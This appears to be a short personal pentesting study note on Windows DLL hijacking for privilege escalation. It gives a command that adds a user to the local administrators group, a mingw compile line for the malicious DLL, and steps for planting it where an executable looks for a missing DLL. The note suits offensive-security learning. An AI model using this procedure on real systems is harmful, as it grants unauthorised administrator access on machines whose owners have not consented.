---
title: DLL Hijacking
updated: 2023-10-10 11:28:14Z
created: 2023-10-03 02:12:32Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# DLL Hijacking

Pre-requisite:  
Open **windows\_dll.c** and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators <user> /add`  
Compile to **file.dll**:  
`x86_64-w64-mingw32-gcc windows_dll.c -shared -o file.dll`

1. Check for any executables that are looking for a DLL file that is not found, AND you have write permissions to the location 

![ee51383be8c91193c9a9c0038d6251ce.png](../../_resources/ee51383be8c91193c9a9c0038d6251ce.png)

2. Place **file.dll** into location with the filename that the executable is looking for